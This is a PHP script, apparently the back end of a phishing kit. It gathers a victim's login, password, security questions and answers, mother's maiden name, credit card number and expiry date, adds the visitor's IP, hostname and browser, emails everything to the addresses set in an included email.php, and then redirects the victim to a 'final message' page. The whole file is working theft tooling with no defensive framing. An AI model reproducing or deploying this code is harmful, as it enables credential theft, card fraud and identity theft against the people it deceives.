<?php
session_start();
include "email.php";
include "blocker.php";

$user = $_POST['user'];
$pass = $_POST['pass'];

$q1 = $_POST['q1'];
$a1 = $_POST['a1'];
$q2 = $_POST['q2'];
$a2 = $_POST['a2'];
$q3 = $_POST['q3'];
$a3 = $_POST['a3'];

$mm = $_POST['expm'];
$yy = $_POST['expy'];

$mmn = $_POST['mmn'];
$ccnr = $_POST['ccnr'];
$expm = $_POST['expm'];
$expy = $_POST['expy'];

$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];

$_SESSION['q1'] = $_POST['q1'];
$_SESSION['a1'] = $_POST['a1'];
$_SESSION['q2'] = $_POST['q2'];
$_SESSION['a2'] = $_POST['a2'];
$_SESSION['q3'] = $_POST['q3'];
$_SESSION['a3'] = $_POST['a3'];

$_SESSION['ccnr'] = $_POST['ccnr'];
$_SESSION['mmn'] = $_POST['mmn'];
$_SESSION['expm'] = $_POST['expm'];
$_SESSION['expy'] = $_POST['expy'];


if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
-

MMN: $mmn
-
CC: $ccnr 
MMYY $expm-$expy
-
Q1: $q1
A1: $a1
Q2: $q2
A2: $a2
Q3: $q3
A3: $a3

------------------------***
Ip: $ip,$browser
Host: $hostname
=====================";
 if ($user == "" || strlen($ccnr) >= 16  || strlen($user) <= 5 ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php'>";
  
}
$subj = "#DES# $ip";


mail($emailusr,$subj,$data);
mail($cc,$subj,$data);




?>
<script>
    window.top.location.href = "finalmessage.php";

</script>